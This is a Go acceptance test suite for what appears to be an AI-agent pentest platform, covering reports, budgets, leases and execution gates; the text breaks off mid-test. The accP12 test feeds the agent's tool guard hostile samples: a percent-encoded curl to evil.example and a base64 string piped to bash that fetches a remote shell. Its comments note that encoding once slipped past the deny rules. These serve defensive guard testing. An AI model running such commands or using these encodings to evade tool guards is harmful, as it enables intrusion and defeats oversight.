package server

import (
	"archive/zip"
	"bytes"
	"context"
	"database/sql"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/Autumn-27/artex/agent"
	"github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/guard"
	"github.com/Autumn-27/artex/intercept"
	"github.com/Autumn-27/norma/agentcore"
	"github.com/Autumn-27/norma/harness"
	"github.com/Autumn-27/norma/llm"
)

// TestAcceptance 是 P1–P7 机制 + P11 交付导出 + P12 拦截可信化 + P13 执行台账与收尾门 + P14 领域化压缩
// + P15 结构化裁决与改参放行 + P18 约束可执行化 + P19 批量交付与同源归并的端到端验收清单：驱动真实的 HTTP 处理器、真实的工具
// 与真实的引擎路径（只有 LLM 与外部目标被夹具替代），每个机制一个子测试。
//
//	go test -count=1 -run TestAcceptance -v ./server/   # 逐机制 PASS/FAIL
//	./acceptance.sh                                     # 一键：一次性隔离库 + 清单
//
// 需要 Postgres（无则整体 skip）。已知边界：P4 的"100% 后落终态"一环需要 LLM 就绪
// 才能跑完终局规划轮，这里断言到"进入收尾时序"为止（终态落库由单测与真实任务覆盖）。
func TestAcceptance(t *testing.T) {
	m, err := NewManager(t.TempDir(), "")
	if err != nil {
		t.Skipf("postgres unavailable (%v) - skipping", err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	t.Cleanup(cancel)
	td := t.TempDir()
	s := New(ctx, m, td, td, td)
	// LIFO：先停全部任务、关库，再轮到 TempDir 清理（避免后台写与 RemoveAll 竞态）。
	t.Cleanup(func() {
		for _, tk := range m.List() {
			s.engine.StopTask(tk.ID)
		}
		_ = m.Close()
	})
	token, err := signJWT(s.jwtKey)
	if err != nil {
		t.Fatal(err)
	}
	env := &accEnv{t: t, m: m, s: s, token: token, ctx: ctx}

	t.Run("P1 语义终态与发现撤回入报告", func(t *testing.T) { accP1(t, env.forTest(t)) })
	t.Run("P2 覆盖矩阵（资产×风险类）入报告", func(t *testing.T) { accP2(t, env.forTest(t)) })
	t.Run("P3 复测结论入报告复核段", func(t *testing.T) { accP3(t, env.forTest(t)) })
	t.Run("P4 预算 70/85% 提示与 100% 收尾时序", func(t *testing.T) { accP4(t, env.forTest(t)) })
	t.Run("P5 租约看门狗回收僵死意图", func(t *testing.T) { accP5(t, env.forTest(t)) })
	t.Run("P6 候选三态闭合入报告", func(t *testing.T) { accP6(t, env.forTest(t)) })
	t.Run("P7 常驻技能注入 system 稳定段", func(t *testing.T) { accP7(t, env.forTest(t)) })
	t.Run("P11 SRC 交付导出（简报 md → docx 可提交件）", func(t *testing.T) { accP11(t, env.forTest(t)) })
	t.Run("P12 拦截遮挡面与失效安全", func(t *testing.T) { accP12(t, env.forTest(t)) })
	t.Run("P13 执行台账与意图收尾门", func(t *testing.T) { accP13(t, env.forTest(t)) })
	t.Run("P14 领域化压缩与常驻索引", func(t *testing.T) { accP14(t, env.forTest(t)) })
	t.Run("P15 结构化裁决与改参放行", func(t *testing.T) { accP15(t, env.forTest(t)) })
	t.Run("P18 约束可执行化（编译为任务级规则）", func(t *testing.T) { accP18(t, env.forTest(t)) })
	t.Run("P19 批量交付与同源归并", func(t *testing.T) { accP19(t, env.forTest(t)) })
}

type accEnv struct {
	t     *testing.T
	m     *Manager
	s     *Server
	token string
	ctx   context.Context
}

// newTask 建一个验收任务，并登记收尾：停引擎运行时 → 清本任务 findings/用量行 → 删任务。
// forTest rebinds the env to a subtest's *testing.T so a failure reds only that
// subtest (FailNow on the parent would abort the remaining checklist).
func (e *accEnv) forTest(t *testing.T) *accEnv {
	c := *e
	c.t = t
	return &c
}

func (e *accEnv) newTask(desc, goal string) (*Task, int64) {
	e.t.Helper()
	task, err := e.m.CreateTask(desc, goal, nil, 0, 0)
	if err != nil {
		e.t.Fatalf("create task: %v", err)
	}
	tid, err := strconv.ParseInt(task.ID, 10, 64)
	if err != nil {
		e.t.Fatal(err)
	}
	e.t.Cleanup(func() {
		e.s.engine.StopTask(task.ID)
		_, _ = e.m.pg.Exec(`DELETE FROM findings WHERE task_id=$1`, tid)
		_, _ = e.m.pg.Exec(`DELETE FROM llm_usage WHERE task_id=$1`, task.ID)
		_, _ = e.m.pg.Exec(`DELETE FROM tool_executions WHERE task_id=$1`, task.ID)
		_ = e.m.pg.DeleteTask(tid)
	})
	return task, tid
}

func (e *accEnv) request(method, path, body string) *httptest.ResponseRecorder {
	var rdr io.Reader
	if body != "" {
		rdr = strings.NewReader(body)
	}
	req := httptest.NewRequest(method, path, rdr)
	req.Header.Set("Authorization", "Bearer "+e.token)
	if body != "" {
		req.Header.Set("Content-Type", "application/json")
	}
	rec := httptest.NewRecorder()
	e.s.Handler().ServeHTTP(rec, req)
	return rec
}

func (e *accEnv) report(task *Task) string {
	e.t.Helper()
	rec := e.request(http.MethodGet, "/api/report?task="+task.ID, "")
	if rec.Code != http.StatusOK {
		e.t.Fatalf("report status=%d body=%s", rec.Code, rec.Body.String())
	}
	return rec.Body.String()
}

func (e *accEnv) mustContain(hay, needle, what string) {
	e.t.Helper()
	if !strings.Contains(hay, needle) {
		e.t.Fatalf("%s：缺少 %q\n--- 报告全文 ---\n%s", what, needle, hay)
	}
}

// newFinding 经真实 report_finding 工具落一条 finding，返回 (finding_id, node_id)。
func (e *accEnv) newFinding(task *Task, tid int64, payload string) (int64, int64) {
	e.t.Helper()
	tsx := agent.NewToolSet(task.Store, "work#1")
	tsx.SetTaskID(tid)
	tool := workflowTool(e.t, tsx.WorkerTools(), "report_finding")
	res, err := tool.Call(context.Background(), json.RawMessage(payload), nil)
	if err != nil || !strings.HasPrefix(res.Flatten(), "finding recorded: ") {
		e.t.Fatalf("report_finding: %v %s", err, res.Flatten())
	}
	var out db.RecordedFinding
	if err := json.Unmarshal([]byte(strings.SplitN(res.Flatten(), "\n", 2)[1]), &out); err != nil {
		e.t.Fatalf("decode finding: %v raw=%s", err, res.Flatten())
	}
	return out.FindingID, out.NodeID
}

func accP1(t *testing.T, e *accEnv) {
	task, tid := e.newTask("acceptance-p1", "终态与撤回")
	fid, _ := e.newFinding(task, tid, `{"vulnclass":"xss","severity":"medium","summary":"反射型 XSS（待推翻）","evidence":"<script> 原样回显","confidence":"medium"}`)
	rec := e.request(http.MethodPatch, "/api/exploration/findings/"+strconv.FormatInt(fid, 10),
		`{"status":"retracted","retract_reason":"复测推翻：输出被 HTML 编码"}`)
	if rec.Code != http.StatusOK {
		t.Fatalf("撤回 status=%d body=%s", rec.Code, rec.Body.String())
	}

	st := task.Store
	sem, err := st.AddIntent(map[string]any{"summary": "语义终态：探针回包否定该假设"}, 5, nil, "planner")
	if err != nil {
		t.Fatal(err)
	}
	if ok, err := st.ClaimIntent(sem, "work#9", db.IntentLeaseTTL); err != nil || !ok {
		t.Fatalf("claim: ok=%v err=%v", ok, err)
	}
	if err := st.SetIntentSemanticOutcome(sem, "negative", "探针发出且回包否定"); err != nil {
		t.Fatal(err)
	}
	if ok, err := st.CompareAndSetIntentState(sem, "running", "negative"); err != nil || !ok {
		t.Fatalf("semantic settle: ok=%v err=%v", ok, err)
	}
	blocked, err := st.AddIntent(map[string]any{"summary": "未测成：模型故障重试用尽"}, 5, nil, "planner")
	if err != nil {
		t.Fatal(err)
	}
	if ok, err := st.CompareAndSetIntentState(blocked, "open", "blocked"); err != nil || !ok {
		t.Fatalf("blocked settle: ok=%v err=%v", ok, err)
	}

	md := e.report(task)
	e.mustContain(md, "## 已撤回（复测推翻；不进正文，保留在案）", "撤回段")
	e.mustContain(md, "复测推翻：输出被 HTML 编码", "撤回原因")
	e.mustContain(md, "## 未测成（blocked/exhausted，不得当作已测干净）", "未测成段")
	e.mustContain(md, "未测成：模型故障重试用尽", "未测成意图")
}

func accP2(t *testing.T, e *accEnv) {
	task, tid := e.newTask("acceptance-p2", "覆盖矩阵")
	as := e.m.Assets()
	if _, err := as.AddAgentScope(tid, "root_domain", "acc-matrix.example", "验收范围", "agent"); err != nil {
		t.Fatal(err)
	}
	asset, err := as.UpsertSubdomain(db.UpsertSubdomainReq{Domain: "api.acc-matrix.example", TaskID: tid})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _, _ = as.DeleteByIDs([]int64{asset}) })

	st := task.Store
	tested, err := st.AddIntent(map[string]any{"summary": "sqli on api（已测干净）", "risk_area": "sqli"}, 5, []int64{asset}, "planner")
	if err != nil {
		t.Fatal(err)
	}
	if err := st.SetIntentState(tested, "negative"); err != nil {
		t.Fatal(err)
	}
	failed, err := st.AddIntent(map[string]any{"summary": "ssrf on api（没测成）", "risk_area": "ssrf"}, 5, []int64{asset}, "planner")
	if err != nil {
		t.Fatal(err)
	}
	if err := st.SetIntentState(failed, "blocked"); err != nil {
		t.Fatal(err)
	}

	md := e.report(task)
	e.mustContain(md, "## 覆盖矩阵（范围内资产 × 风险类）", "覆盖矩阵段")
	e.mustContain(md, "sqli：已测", "已测单元格")
	e.mustContain(md, "ssrf：未测成", "未测成单元格")
	e.mustContain(md, "api.acc-matrix.example", "范围内资产")
}

func accP3(t *testing.T, e *accEnv) {
	task, tid := e.newTask("acceptance-p3", "复测结论")
	fid, _ := e.newFinding(task, tid, `{"vulnclass":"sqli","severity":"high","summary":"注入（将被复测确认修复）","evidence":"sleep 5 生效","confidence":"high"}`)
	rt, conv, ok, err := e.m.pg.CreateFindingRetest(context.Background(), fid, "验收复测")
	if err != nil || !ok || rt == nil || conv == nil {
		t.Fatalf("create retest: %v ok=%v", err, ok)
	}
	if ok, err := e.m.pg.StartFindingRetest(context.Background(), rt.ID); err != nil || !ok {
		t.Fatalf("start retest: %v ok=%v", err, ok)
	}
	if err := e.m.pg.RecordFindingRetestResult(context.Background(), conv.ID, "fixed", "复测确认修复", "同一 payload 返回 400，控制点已生效"); err != nil {
		t.Fatal(err)
	}
	if err := e.m.pg.FinishFindingRetest(rt.ID, "completed", ""); err != nil {
		t.Fatal(err)
	}

	md := e.report(task)
	e.mustContain(md, "## 复核结论（最新复测非“复现”）", "复核段")
	e.mustContain(md, "已修复（复测确认）", "复测结论标签")
}

func accP4(t *testing.T, e *accEnv) {
	old, had, err := e.m.pg.GetSetting(settingTokenBudget)
	if err != nil {
		t.Fatal(err)
	}
	if err := e.m.pg.SetSetting(settingTokenBudget, "1000"); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		if had {
			_ = e.m.pg.SetSetting(settingTokenBudget, old)
		} else {
			_, _ = e.m.pg.Exec(`DELETE FROM settings WHERE key=$1`, settingTokenBudget)
		}
	})
	task, _ := e.newTask("acceptance-p4", "预算护栏")
	use := func(in, out int) {
		if err := e.m.pg.InsertLLMUsage(&db.LLMUsage{TaskID: task.ID, InputTokens: in, OutputTokens: out, Status: "ok"}); err != nil {
			t.Fatal(err)
		}
	}
	hints := func() string {
		task.trigMu.Lock()
		defer task.trigMu.Unlock()
		var b strings.Builder
		for _, ev := range task.pendingTriggers {
			b.WriteString(strings.Join(ev.Hints, "\n"))
			b.WriteString("\n")
		}
		return b.String()
	}
	waitFor := func(what string, cond func() bool) {
		deadline := time.Now().Add(20 * time.Second)
		for time.Now().Before(deadline) {
			if cond() {
				return
			}
			time.Sleep(200 * time.Millisecond)
		}
		t.Fatalf("等待超时：%s（hints=%q）", what, hints())
	}

	use(500, 200) // 700/1000 → 70%
	e.s.engine.startDeadlineCoordinator(e.ctx, task)
	waitFor("70% 提示投递", func() bool { return strings.Contains(hints(), "预算提示 70%") })
	use(100, 50) // 850/1000 → 85%
	waitFor("85% 提示投递", func() bool { return strings.Contains(hints(), "预算提示 85%") })
	if n := strings.Count(hints(), "预算提示 70%"); n != 1 {
		t.Fatalf("70%% 提示应只投一次，实际 %d 次：%q", n, hints())
	}
	// 档位提示同时要在时间线留痕（system 活动），而不只存在于 planner 上下文里。
	timeline := func() string {
		acts, _, err := task.Store.ActivityList(nil, 0, 200)
		if err != nil {
			t.Fatalf("activity list: %v", err)
		}
		var b strings.Builder
		for _, a := range acts {
			b.WriteString(a.Summary)
			b.WriteString("\n")
		}
		return b.String()
	}
	// 时间线断言也走等待：活动写入与提示投递是两个动作，别把"提示到了"当成
	// "时间线已落"（产品侧已改成活动先落，这里再等一次，双保险）。
	waitFor("时间线 70% 档位", func() bool { return strings.Contains(timeline(), "Token 预算 70%") })
	waitFor("时间线 85% 档位", func() bool { return strings.Contains(timeline(), "Token 预算 85%") })

	use(150, 0) // 1000/1000 → exhausted
	waitFor("进入收尾时序(settling)", func() bool { return e.s.engine.isSettling(task.ID) })
	e.mustContain(timeline(), "Token 预算耗尽", "时间线耗尽记录")
}

func accP5(t *testing.T, e *accEnv) {
	task, _ := e.newTask("acceptance-p5", "租约回收")
	st := task.Store
	intent, err := st.AddIntent(map[string]any{"summary": "将被看门狗回收的僵死意图"}, 5, nil, "planner")
	if err != nil {
		t.Fatal(err)
	}
	if ok, err := st.ClaimIntent(intent, "work#1", db.IntentLeaseTTL); err != nil || !ok {
		t.Fatalf("claim: ok=%v err=%v", ok, err)
	}
	if _, err := e.m.pg.Exec(`UPDATE exploration_nodes SET heartbeat_at=now()-interval '30 minutes', lease_expires_at=now()-interval '15 minutes' WHERE id=$1`, intent); err != nil {
		t.Fatal(err)
	}
	e.s.engine.sweepExpiredLeases(task)
	node, err := st.GetNode(intent)
	if err != nil || node == nil || node.State != "open" || node.Owner != "" {
		t.Fatalf("回收后状态不对: %+v err=%v", node, err)
	}
	acts, _, err := st.ActivityList(nil, 0, 50)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, a := range acts {
		if strings.Contains(a.Summary, "意图租约到期回收") {
			found = true
		}
	}
	if !found {
		t.Fatalf("时间线缺少回收记录：%+v", acts)
	}
}

func accP6(t *testing.T, e *accEnv) {
	task, tid := e.newTask("acceptance-p6", "候选闭合")
	tsx := agent.NewToolSet(task.Store, "work#1")
	tsx.SetTaskID(tid)
	closeTool := workflowTool(t, tsx.WorkerTools(), "close_candidate")
	for _, in := range []string{
		`{"candidate":"登录口疑似 SQLi","outcome":"ruled_out","counterevidence":"服务端参数化查询：payload 原样出现在错误日志、未参与执行","confidence":"high","vulnclass":"sqli","severity":"high"}`,
		`{"candidate":"搜索框疑似存储型 XSS","outcome":"open_proof_gap","proof_gap":"缺登录态，无法验证渲染时是否执行","confidence":"low","vulnclass":"xss","severity":"medium"}`,
	} {
		res, err := closeTool.Call(context.Background(), json.RawMessage(in), nil)
		if err != nil || !strings.HasPrefix(res.Flatten(), "candidate closed:") {
			t.Fatalf("close_candidate: %v %s", err, res.Flatten())
		}
	}

	md := e.report(task)
	e.mustContain(md, "## 已排除候选（有反证；不进正文，保留在案）", "已排除段")
	e.mustContain(md, "服务端参数化查询", "反证文本")
	e.mustContain(md, "## 存疑待补证（缺口未闭合，不得视为安全）", "存疑段")
	e.mustContain(md, "缺登录态", "缺口文本")
}

// accP11 走完交付面全链：真实 report_finding 落一条发现 → 绑定一条 proof 原始报文 →
// GET src-report（8 块骨架 + 整包）→ GET src-report.docx（合法 OOXML zip，正文含整包）。
func accP11(t *testing.T, e *accEnv) {
	task, tid := e.newTask("acceptance-p11", "SRC 交付导出")
	fid, _ := e.newFinding(task, tid, `{"vulnclass":"sqli","severity":"high","summary":"搜索接口注入（交付导出验收）","evidence":"curl http://x/search?q=1 单引号触发报错","confidence":"high"}`)

	// 绑定一条 proof 证据（原始报文头），让导出能生成「涉及接口清单 + 整包步骤」。
	sn := db.TrafficEvidenceSnapshot{
		SourceTrafficID: "acc-p11-1",
		URL:             "https://acc-p11.example/search?q=1'",
		Method:          "GET",
		Status:          500,
		ContentType:     "text/html",
		ReqHead:         "GET /search?q=1' HTTP/1.1\nHost: acc-p11.example\nAccept-Encoding: gzip, deflate\nConnection: close",
		RespHead:        "HTTP/1.1 500 Internal Server Error",
	}
	sn = sn.Normalize()
	sn.ID = db.TrafficSnapshotID(sn)
	if err := e.m.pg.WithEvidenceTx(context.Background(), func(tx *sql.Tx) error {
		return db.AddFindingTrafficTx(tx, fid, []db.PreparedTrafficEvidence{{
			Ref:      db.TrafficRef{Role: "proof", Note: "打穿请求"},
			Snapshot: sn,
		}})
	}); err != nil {
		t.Fatalf("bind proof traffic: %v", err)
	}

	fidStr := strconv.FormatInt(fid, 10)
	rec := e.request(http.MethodGet, "/api/findings/"+fidStr+"/src-report", "")
	if rec.Code != http.StatusOK {
		t.Fatalf("src-report status=%d body=%s", rec.Code, rec.Body.String())
	}
	md := rec.Body.String()
	for _, want := range []string{
		"漏洞标题：",
		"目标网站URL：https://acc-p11.example/search?q=1'",
		"漏洞等级：高危",
		"漏洞描述：\n",
		"漏洞危害：\n",
		"涉及接口清单\n1、GET https://acc-p11.example/search?q=1'（打穿请求（proof）",
		"复现步骤\n1、打穿请求（proof）：打穿请求\n```\nGET /search?q=1' HTTP/1.1\nHost: acc-p11.example",
		"修复建议\n",
	} {
		e.mustContain(md, want, "SRC 简报")
	}
	for _, line := range strings.Split(md, "\n") {
		if strings.TrimSpace(line) == "#" {
			t.Fatalf("SRC 简报出现半角 # 分隔行：\n%s", md)
		}
	}

	rec = e.request(http.MethodGet, "/api/findings/"+fidStr+"/src-report.docx", "")
	if rec.Code != http.StatusOK {
		t.Fatalf("docx status=%d body=%s", rec.Code, rec.Body.String())
	}
	zr, err := zip.NewReader(bytes.NewReader(rec.Body.Bytes()), int64(rec.Body.Len()))
	if err != nil {
		t.Fatalf("docx 不是合法 zip：%v", err)
	}
	var doc string
	for _, f := range zr.File {
		if f.Name != "word/document.xml" {
			continue
		}
		rc, err := f.Open()
		if err != nil {
			t.Fatal(err)
		}
		b, err := io.ReadAll(rc)
		rc.Close()
		if err != nil {
			t.Fatal(err)
		}
		doc = string(b)
	}
	if doc == "" {
		t.Fatal("docx 缺少 word/document.xml")
	}
	for _, want := range []string{"漏洞等级", "复现步骤", "GET /search?q=1", "Host: acc-p11.example", "修复建议"} {
		if !strings.Contains(doc, want) {
			t.Fatalf("docx 正文缺少 %q", want)
		}
	}
}

// accP12 走真实的 guard → intercept 链路（与生产同一条 hook 入口）：编码混淆不再
// 绕过 deny 规则、RoE 对 base64 目标可见、规则加载失败失效安全、dry-run 不落库。
func accP12(t *testing.T, e *accEnv) {
	task, tid := e.newTask("acceptance-p12", "拦截遮挡面")
	// 环境变量 ARTEX_SCOPE_ENFORCEMENT 优先于 setting（部署可用 .env 强制开关）；
	// 本用例要验证的是 setting 路径与抽取逻辑，先清掉环境覆盖保证确定性。
	t.Setenv("ARTEX_SCOPE_ENFORCEMENT", "")
	// 与生产同款：把任务上下文挂进 ctx（guard 的审计行按 task_id 归属）。
	ctx := intercept.WithTaskContext(context.Background(), task.ID, "acceptance", nil)

	// 先把 RoE 模式显式置 off：scope 查询有 30s TTL 缓存（生产设计），若前面的
	// 用例把模式留成 deny/ask，①② 会先查一次 scope 并把「空范围」缓存下来，
	// ③ 再翻 deny 也读不到刚加的范围行——本用例必须不依赖缓存冷暖。
	oldMode, had, err := e.m.pg.GetSetting("intercept_scope_mode")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		if had {
			_ = e.m.pg.SetSetting("intercept_scope_mode", oldMode)
		} else {
			_, _ = e.m.pg.Exec(`DELETE FROM settings WHERE key=$1`, "intercept_scope_mode")
		}
	})
	if err := e.m.pg.SetSetting("intercept_scope_mode", "off"); err != nil {
		t.Fatal(err)
	}
	if _, err := e.m.Assets().AddAgentScope(tid, "root_domain", "acc-p12.example", "验收范围", "agent"); err != nil {
		t.Fatal(err)
	}

	rule, err := e.m.pg.CreateInterceptRule("acc-deny-evil", "tool_input", "string", "evil.example", "deny", "", 100, true, false, 0, "deny")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = e.m.pg.DeleteInterceptRule(rule.ID) })
	e.s.m.interceptor.Invalidate()
	g := guard.NewWithInterceptor(e.s.m.interceptor, tid)

	// ① 百分号编码的目标 → 被 deny（此前只匹配整段原文，会静默绕过）
	blocked, reason, _ := g.Hooks().PreToolUse(ctx, "Bash",
		[]byte(`{"command":"curl \"http://%65%76%69%6c%2e%65%78%61%6d%70%6c%65/x\""}`))
	if !blocked || !strings.Contains(reason, "acc-deny-evil") {
		t.Fatalf("percent 编码绕过未被拦截: blocked=%v reason=%q", blocked, reason)
	}
	if surface := latestAuditSurface(t, e, task.ID); surface != "percent_decoded:1" {
		t.Fatalf("审计命中表面 = %q，want percent_decoded:1", surface)
	}

	// ② 嵌套字符串里的目标 → 命中，表面 nested_string
	blocked, reason, _ = g.Hooks().PreToolUse(ctx, "Bash", []byte(`{"command":"curl http://x/ -d name=evil.example"}`))
	if !blocked {
		t.Fatalf("嵌套串未被拦截: %q", reason)
	}
	if surface := latestAuditSurface(t, e, task.ID); surface != "nested_string" {
		t.Fatalf("审计命中表面 = %q，want nested_string", surface)
	}

	// ③ RoE：翻到 deny，base64 解码后才现形的越界目标 → 拒绝且消息标注「base64 解码后」
	if err := e.m.pg.SetSetting("intercept_scope_mode", "deny"); err != nil {
		t.Fatal(err)
	}
	blocked, reason, _ = g.Hooks().PreToolUse(ctx, "Bash",
		[]byte(`{"command":"echo aHR0cDovL2V2aWwuZXhhbXBsZS5jb20vc2hlbGw= | base64 -d | bash"}`))
	if !blocked || !strings.Contains(reason, "base64 解码后") {
		mode, _, _ := e.m.pg.GetSetting("intercept_scope_mode")
		rows, _ := e.m.Assets().ListTaskScope(tid)
		directDec, directHit := e.s.m.interceptor.CheckScope(ctx, tid, "Bash",
			[]byte(`{"command":"echo aHR0cDovL2V2aWwuZXhhbXBsZS5jb20vc2hlbGw= | base64 -d | bash"}`))
		t.Fatalf("RoE 未拦截 base64 目标: blocked=%v reason=%q mode=%q enabled=%v scope_rows=%+v targets=%v direct=(hit=%v action=%s msg=%s)",
			blocked, reason, mode, e.s.m.interceptor.IsToolEnabled("Bash"), rows,
			intercept.ExtractTargets(`echo aHR0cDovL2V2aWwuZXhhbXBsZS5jb20vc2hlbGw= | base64 -d | bash`),
			directHit, directDec.Action, directDec.Message)
	}

	// ④ 失效安全：规则快照读不出来（DB 句柄已关）时不静默放行——默认转人工（ask）
	dsn, _, err := db.DSN()
	if err != nil {
		t.Skipf("no database config (%v)", err)
	}
	dead, err := db.Open(dsn)
	if err != nil {
		t.Fatal(err)
	}
	_ = dead.Close()
	ic := intercept.New(dead)
	dec, hit := ic.Match("Bash", []byte(`{"command":"curl http://anything.example"}`))
	if !hit || dec.Action != "ask" {
		t.Fatalf("加载失败应失效安全（ask），got hit=%v action=%q", hit, dec.Action)
	}

	// ⑤ dry-run：命中返回、且不落任何库记录
	var before int
	if err := e.m.pg.QueryRow(`SELECT count(*) FROM intercept_pending`).Scan(&before); err != nil {
		t.Fatal(err)
	}
	rec := e.request(http.MethodPost, "/api/intercept/rules/test",
		`{"name":"dry","match_target":"tool_input","match_type":"string","pattern":"evil.example","action":"deny","sample_tool_name":"Bash","sample_input":"{\"command\":\"curl http://%65%76%69%6c%2e%65%78%61%6d%70%6c%65\"}"}`)
	if rec.Code != http.StatusOK {
		t.Fatalf("dry-run status=%d body=%s", rec.Code, rec.Body.String())
	}
	body := rec.Body.String()
	if !strings.Contains(body, `"matched":true`) || !strings.Contains(body, "percent_decoded:1") {
		t.Fatalf("dry-run 未命中编码目标: %s", body)
	}
	var after int
	if err := e.m.pg.QueryRow(`SELECT count(*) FROM intercept_pending`).Scan(&after); err != nil {
		t.Fatal(err)
	}
	if after != before {
		t.Fatalf("dry-run 不应落库: before=%d after=%d", before, after)
	}
}

// latestAuditSurface 读该任务最近一条 denied 审计里的命中表面（P12 留痕）。
func latestAuditSurface(t *testing.T, e *accEnv, taskID string) string {
	t.Helper()
	var audit string
	if err := e.m.pg.QueryRow(`SELECT COALESCE(audit::text,'') FROM intercept_pending WHERE task_id=$1 AND status='denied' ORDER BY id DESC LIMIT 1`, taskID).Scan(&audit); err != nil {
		t.Fatalf("读拦截审计: %v", err)
	}
	var parsed struct {
		MatchedSurface string `json:"matched_surface"`
	}
	if err := json.Unmarshal([]byte(audit), &parsed); err != nil {
		t.Fatalf("审计不是 JSON: %v (%s)", err, audit)
	}
	return parsed.MatchedSurface
}

func accP7(t *testing.T, e *accEnv) {
	dir := t.TempDir()
	skillDir := filepath.Join(dir, "always-rules")
	if err := os.MkdirAll(skillDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(skillDir, "SKILL.md"),
		[]byte("---\nname: always-rules\ndescription: 验收常驻技能\n---\n\n# 铁律\n永远先读证据、再下结论。\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	oldAugment := agent.ToolAugment
	wireAgentAugment(e.m.pg, dir, nil)
	t.Cleanup(func() { agent.ToolAugment = oldAugment })

	a, err := e.m.pg.GetAgentByKey("worker")
	if err != nil || a == nil {
		t.Fatalf("worker agent: %v", err)
	}
	if err := e.m.pg.SetAgentSkillBindings(a.ID, []db.SkillBinding{{Name: "always-rules", Always: true}}); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = e.m.pg.SetAgentSkillBindings(a.ID, nil) })

	_, def, cleanup := agent.ToolAugment(context.Background(), "worker")
	if cleanup != nil {
		defer cleanup()
	}
	if !strings.Contains(def.AlwaysSkills, "【常驻技能 · 始终遵守】") || !strings.Contains(def.AlwaysSkills, "永远先读证据") {
		t.Fatalf("常驻技能未注入 system 稳定段：%q", def.AlwaysSkills)
	}
}

// accP13 走完托管长任务的整条契约：工具起执行（id + 绝对输出路径）、有界等待超时
// 不是错误、worker 收笔时执行还在跑则意图不判完（收尾门 + execution_pending）、
// 执行落终态后观察者把意图退回 open 续跑（execution_done + 唤醒 planner）、看门狗
// 对有在跑执行的意图让路、重启遗留行对账为 orphaned 而非 failed、取消理由回传并
// 落库、negative 证据门先拒后过。
func accP13(t *testing.T, e *accEnv) {
	task, tid := e.newTask("acceptance-p13", "托管长任务与收尾门")
	st := task.Store
	svc := e.m.Executions()
	if svc == nil {
		t.Fatal("执行服务未接线")
	}
	ctx := context.Background()

	intent, err := st.AddIntent(map[string]any{"summary": "起一条长任务再收笔"}, 5, nil, "planner")
	if err != nil {
		t.Fatal(err)
	}
	if ok, err := st.ClaimIntent(intent, "work#1", db.IntentLeaseTTL); err != nil || !ok {
		t.Fatalf("claim: ok=%v err=%v", ok, err)
	}

	tsx := agent.NewToolSet(st, "work#1")
	tsx.SetTaskID(tid)
	tsx.SetOwnerNode(intent)
	tsx.SetExecService(svc)
	runTool := workflowTool(t, tsx.WorkerTools(), "run_execution")
	waitTool := workflowTool(t, tsx.WorkerTools(), "wait_execution")
	cancelTool := workflowTool(t, tsx.WorkerTools(), "cancel_execution")

	// ① run_execution：返回 execution_id 与输出文件的绝对路径，文件真实存在。
	res, err := runTool.Call(ctx, json.RawMessage(`{"command":"sleep 4","description":"验收：长任务","timeout_ms":0}`), nil)
	if err != nil || !strings.Contains(res.Flatten(), "execution started: ") {
		t.Fatalf("run_execution: %v %s", err, res.Flatten())
	}
	var started struct {
		ID         int64  `json:"execution_id"`
		Status     string `json:"status"`
		OutputPath string `json:"output_path"`
	}
	if err := json.Unmarshal([]byte(execSnapshotJSON(t, res.Flatten())), &started); err != nil {
		t.Fatalf("decode execution snapshot: %v raw=%s", err, res.Flatten())
	}
	if started.ID <= 0 || started.Status != db.ExecRunning {
		t.Fatalf("执行快照不对: %+v", started)
	}
	if !filepath.IsAbs(started.OutputPath) || !strings.Contains(started.OutputPath, filepath.Join("tasks", task.ID, "executions")) {
		t.Fatalf("输出路径必须是任务执行目录下的绝对路径: %q", started.OutputPath)
	}
	if _, err := os.Stat(started.OutputPath); err != nil {
		t.Fatalf("输出文件不存在: %v", err)
	}

	// ② wait_execution 到点仍是 running → 正常返回（不是错误），并带部分输出字段。
	wres, err := waitTool.Call(ctx, json.RawMessage(`{"execution_id":`+itoa64(started.ID)+`,"timeout_ms":300}`), nil)
	if err != nil {
		t.Fatalf("wait_execution: %v", err)
	}
	if !strings.Contains(wres.Flatten(), "超时是观察不是失败") || !strings.Contains(wres.Flatten(), "running") {
		t.Fatalf("超时等待必须读作观察而非失败: %s", wres.Flatten())
	}

	// ③ 收尾门：执行在跑 → 意图不判完，留 running + execution_pending 时间线。
	if !e.s.engine.execGate(task, intent, "work#1") {
		t.Fatal("有在跑执行时必须拦住收尾")
	}
	node, err := st.GetNode(intent)
	if err != nil || node == nil || node.State != "running" {
		t.Fatalf("收尾门后意图仍在 running: %+v err=%v", node, err)
	}
	if !activitySeen(t, st, "execution_pending") {
		t.Fatal("时间线缺少 execution_pending")
	}
	// 反向对照：名下没有在跑执行的意图，门必须放行（否则任何意图都收不了尾）。
	quiet, err := st.AddIntent(map[string]any{"summary": "没有长任务的意图"}, 5, nil, "planner")
	if err != nil {
		t.Fatal(err)
	}
	if e.s.engine.execGate(task, quiet, "work#1") {
		t.Fatal("没有在跑执行时门必须放行")
	}

	// ④ 看门狗让路：租约过期但执行在跑 → 不收这条意图。
	if _, err := e.m.pg.Exec(`UPDATE exploration_nodes SET heartbeat_at=now()-interval '30 minutes', lease_expires_at=now()-interval '15 minutes' WHERE id=$1`, intent); err != nil {
		t.Fatal(err)
	}
	e.s.engine.sweepExpiredLeases(task)
	if node, _ := st.GetNode(intent); node == nil || node.State != "running" {
		t.Fatalf("有在跑执行时看门狗不得回收: %+v", node)
	}

	// ⑤ 执行落终态 → 观察者把意图退回 open 并写 execution_done（planner 被唤醒）。
	deadline := time.Now().Add(30 * time.Second)
	for time.Now().Before(deadline) {
		if n, _ := st.GetNode(intent); n != nil && n.State == "open" {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	if node, _ := st.GetNode(intent); node == nil || node.State != "open" {
